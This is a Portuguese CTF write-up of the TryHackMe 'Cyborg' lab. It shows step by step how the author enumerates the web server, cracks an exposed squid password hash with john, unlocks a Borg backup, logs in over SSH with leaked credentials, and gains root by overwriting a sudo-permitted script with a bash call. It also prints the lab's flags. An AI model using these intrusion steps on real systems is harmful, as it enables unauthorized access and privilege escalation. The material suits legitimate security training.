# Cyborg - Writeup (THM)

![hacking-writeups-thm-cyborg-banner.png](uploads/images/hacking-writeups-thm-cyborg-banner.png)

Neste artigo vamos ver o meu passo-à-passo para resolver o desafio **Cyborg** na plataforma do **TryHackMe**! Vale lembrar que tudo isso foi registrado com base na minha experiência e que pode haver outras formas e meios de se chegar aos mesmos resultados. Sabendo disso, vamos lá!

---

Antes de começar, vamos adicionar o endereço gerado pela plataforma em um arquivo TXT para que não tenhamos que ficar redigitando o mesmo sempre que necessário, pois podemos pegar o valor utilizando o comando `cat`:

```bash
$ echo "10.10.121.139" > ip.txt

$ cat ip.txt
10.10.121.139
```

Vamos começar identificando as portas abertas no servidor utilizando o `nmap`:

```bash
$ sudo nmap -sS -sV -sC $(cat ip.txt) -T4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-03 17:04 EDT
Nmap scan report for 10.10.121.139
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.30 seconds
```

Jóia! agora sabemos que temos duas portas abertas e uma delas é web. Vamos utilizar o `gobuster` para fazer um brute-force para mapear diretórios e arquivos.

> **Dica**: Uma lista muito boa e que eu utilizo bastante para esse tipo de ataque é a `fuzz.txt`: [https://github.com/Bo0oM/fuzz.txt](https://github.com/Bo0oM/fuzz.txt)

Com a lista baixada, podemos entrar com o seguinte comando:

```bash
$ gobuster dir -u http://10.10.121.139/ -w ~/Tools/fuzz.txt/fuzz.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.121.139/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/zerodois/Tools/fuzz.txt/fuzz.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/07/03 18:11:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.ht_wsr.txt          (Status: 403) [Size: 277]
/.htaccess-dev        (Status: 403) [Size: 277]
/.htaccess-local      (Status: 403) [Size: 277]
/.htaccess-marco      (Status: 403) [Size: 277]
/.htaccess.old        (Status: 403) [Size: 277]
/.htaccess.BAK        (Status: 403) [Size: 277]
/.htaccess.bak1       (Status: 403) [Size: 277]
/.htaccess.bak        (Status: 403) [Size: 277]
/.htaccess.orig       (Status: 403) [Size: 277]
/.htaccess.sample     (Status: 403) [Size: 277]
/.htaccess.save       (Status: 403) [Size: 277]
/.htaccess_orig       (Status: 403) [Size: 277]
/.htaccess_extra      (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htaccessBAK         (Status: 403) [Size: 277]
/.htaccessOLD2        (Status: 403) [Size: 277]
/.htaccess_sc         (Status: 403) [Size: 277]
/.htaccessOLD         (Status: 403) [Size: 277]
/.htaccess~           (Status: 403) [Size: 277]
/.htgroup             (Status: 403) [Size: 277]
/.htpasswd-old        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd_test       (Status: 403) [Size: 277]
/.httr-oauth          (Status: 403) [Size: 277]
/.htusers             (Status: 403) [Size: 277]
/.htpasswds           (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.121.139/admin/]
/admin/               (Status: 200) [Size: 5771]
/admin/.htaccess      (Status: 403) [Size: 277]
/admin/admin.html     (Status: 200) [Size: 4926]
/admin/index.html     (Status: 200) [Size: 5771]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.121.139/etc/]
/etc/                 (Status: 200) [Size: 927]
/index.html           (Status: 200) [Size: 11321]
/server-status/       (Status: 403) [Size: 277]

===============================================================
2022/07/03 18:13:53 Finished
===============================================================
```

Agora sabemos que há diretórios e arquivos que podem nos ajudar daqui pra frente: `/ect`, `/admin` e `/admin/admin.html`.

Quando acessamos o diretório web `/etc` nos deparamos com uma resposta semelhante à esta:

```bash
Index of /etc

Name	Last modified	Size	Description
---------------------------------------------------------
Parent Directory	 	-
squid/	2020-12-30 02:09	-
---------------------------------------------------------
Apache/2.4.18 (Ubuntu) Server at 10.10.121.139 Port 80
```

Dentro do diretório `squid` há um arquivo denominado `passwd`que pode conter alguma informação importante, e realmente há (`/etc/squid/passwd`):

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

Vamos guardar essa informação!

Ao acessar a página `admin/admin.html`, temos uma espécie de log de um bate papo registrado entre 3 pessoas/usuários:

```
############################################
############################################
[Yesterday at 4.32pm from Josh]
Are we all going to watch the football game at the weekend??
############################################
############################################
[Yesterday at 4.33pm from Adam]
Yeah Yeah mate absolutely hope they win!
############################################
############################################
[Yesterday at 4.35pm from Josh]
See you there then mate!
############################################
############################################
[Today at 5.45am from Alex]
Ok sorry guys i think i messed something up, uhh i was playing around with the squid proxy i mentioned earlier.
I decided to give up like i always do ahahaha sorry about that.
I heard these proxy things are supposed to make your website secure but i barely know how to use it so im probably making it more insecure in the process.
Might pass it over to the IT guys but in the meantime all the config files are laying about.
And since i dont know how it works im not sure how to delete them hope they don't contain any confidential information lol.
other than that im pretty sure my backup "music_archive" is safe just to confirm.
############################################
############################################
```

> No menu superior, há um menu de `Archive > Download` onde podemos baixar um arquivo compactado.

No trecho abaixo, vamos extrair os dados e verificar os arquivos de forma recursiva para ver se conseguimos identificar algo que possa ser suspeito:

```bash
$ tar -xf archive.tar
$ ls -l -R ./home
home:
total 4
drwxr-xr-x 3 zerodois zerodois 4096 Jul  3 22:27 field

home/field:
total 4
drwxr-xr-x 3 zerodois zerodois 4096 Jul  3 22:27 dev

home/field/dev:
total 4
drwxr-xr-x 3 zerodois zerodois 4096 Dec 29  2020 final_archive

home/field/dev/final_archive:
total 68
-rw------- 1 zerodois zerodois   964 Dec 29  2020 config
drwx------ 3 zerodois zerodois  4096 Dec 29  2020 data
-rw------- 1 zerodois zerodois    54 Dec 29  2020 hints.5
-rw------- 1 zerodois zerodois 41258 Dec 29  2020 index.5
-rw------- 1 zerodois zerodois   190 Dec 29  2020 integrity.5
-rw------- 1 zerodois zerodois    16 Dec 29  2020 nonce
-rw------- 1 zerodois zerodois    73 Dec 29  2020 README

home/field/dev/final_archive/data:
total 4
drwx------ 2 zerodois zerodois 4096 Dec 29  2020 0

home/field/dev/final_archive/data/0:
total 1484
-rw------- 1 zerodois zerodois      17 Dec 29  2020 1
-rw------- 1 zerodois zerodois      17 Dec 29  2020 3
-rw------- 1 zerodois zerodois 1506824 Dec 29  2020 4
-rw------- 1 zerodois zerodois      17 Dec 29  2020 5
```

Após a extração e analisando os arquivos do diretório `home/field/dev/final_archive`, encontramos uma informação dentro do arquivo README:

```bash
This is a Borg Backup Repository.
See https://borgbackup.readthedocs.io/
```

Jóia! Agora sabemos também que trata-se de um backup gerado utilizando a ferramenta `borg`.

Para fazer a instalação do mesmo (caso ainda não tenha) basta entrar com o seguitne comando no seu terminal:

```bash
$ sudo apt install borgbackup -y
```

Podemos tentar listar as informações utilizando o borg, mas aparentemente precisamos de uma senha, conforme trecho abaixo:

```bash
$ borg list ./home/field/dev/final_archive
Enter passphrase for key /home/zerodois/Workspace/thm/cyborg/home/field/dev/final_archive:
```

Lembra da informação que encontramos no arquivo `passwd` no diretório web `/etc/squid`? Pois é! Aquela informação é o hash de uma senha e muito provavelmente trata-se da senha que precisamos para acessar os dados do arquivo de backup gerado com o borg.

Primeiramente, vamos armazenar o hash em um arquivo e utilizar a ferramenta `john` para realizar um brute-force e tentar e identificar a qual senha esse hash corresponde.

```bash
$ echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt
```

A lista que vamos utilizar com o `john` é a `rockyou.txt` que conta com mais de 14 milhões das senhas mais comuns utilizadas ao redor do mundo:

```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2022-07-03 22:36) 4.347g/s 169460p/s 169460c/s 169460C/s 112806..samantha5
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Conseguimos!!! A senha é: **squidward**.

Agora podemos tentar listar e extrair os arquivos:

```bash
$ borg list ./home/field/dev/final_archive
Enter passphrase for key /home/zerodois/Workspace/thm/cyborg/home/field/dev/final_archive:
music_archive                        Tue, 2020-12-29 09:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]

$ borg extract ./home/field/dev/final_archive::music_archive
$ ls -l -R ./home/alex/
./home/alex/:
total 32
drwxrwxr-x 2 zerodois zerodois 4096 Dec 29  2020 Desktop
drwxrwxr-x 2 zerodois zerodois 4096 Dec 29  2020 Documents
drwxrwxr-x 2 zerodois zerodois 4096 Dec 28  2020 Downloads
drwxrwxr-x 2 zerodois zerodois 4096 Dec 28  2020 Music
drwxrwxr-x 2 zerodois zerodois 4096 Dec 28  2020 Pictures
drwxrwxr-x 2 zerodois zerodois 4096 Dec 28  2020 Public
drwxrwxr-x 2 zerodois zerodois 4096 Dec 28  2020 Templates
drwxrwxr-x 2 zerodois zerodois 4096 Dec 28  2020 Videos

./home/alex/Desktop:
total 4
-rw-r--r-- 1 zerodois zerodois 71 Dec 29  2020 secret.txt

./home/alex/Documents:
total 4
-rw-r--r-- 1 zerodois zerodois 110 Dec 29  2020 note.txt

./home/alex/Downloads:
total 0

./home/alex/Music:
total 0

./home/alex/Pictures:
total 0

./home/alex/Public:
total 0

./home/alex/Templates:
total 0

./home/alex/Videos:
total 0
```

Depois de extrair o backup e fazer uma listagem recursiva, encontramos o arquivo `./home/alex/Desktop/secret.txt` e `./home/alex/Documents/note.txt`:

```bash
$ cat ./home/alex/Desktop/secret.txt
shoutout to all the people who have gotten to this stage whoop whoop!

$ cat ./home/alex/Documents/note.txt
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

Agora sim! Vamos tentar entrar com a senha do Alex via SSH:

```bash
$ ssh alex@10.10.121.139
# S3cretP@s3
```

Depois de entrar e fazer uma listagem, só nos resta ler o conteúdo de `user.txt`:

```bash
$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

Ainda nos resta tentar uma escalação de privilégios para ver se encontramos a última flag que nos falta para completar este desafio. Ao executar o comando `sudo -l`identificamos um arquivo que podemos executar como super usuário sem precisar de uma senha de administrador:

```bash
$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

No entanto ele não possui nada que possa nos ajudar, mas podemos fazer com que ele possua, tentando fazer com que ele execute uma nova instancia do bash como super usuário:

```bash
$ echo "/bin/bash" > /etc/mp3backups/backup.sh
-bash: /etc/mp3backups/backup.sh: Permission denied
```

Nada feito, mas se temos permissão para execução, vamos tentar trocar as permissões do arquivo, lebrando geral:

```bash
$ chmod 777 /etc/mp3backups/backup.sh
```

Vamos tentar novamente:

```bash
$ echo "/bin/bash" > /etc/mp3backups/backup.sh
```

Sucesso! Basta agora executar o arquivo e testar o acesso como root:

```bash
$ sudo /etc/mp3backups/backup.sh
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Aaah garoto! Daqui em diante é só correr para pegar o nosso prêmio:

```bash
$ ls /root/
root.txt

$ cat /root/root.txt
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

---

Mais uma vez, espero que tenha aprendido algo e que este artigo sirva como base na resolução de problemas futuros.

Abraços!
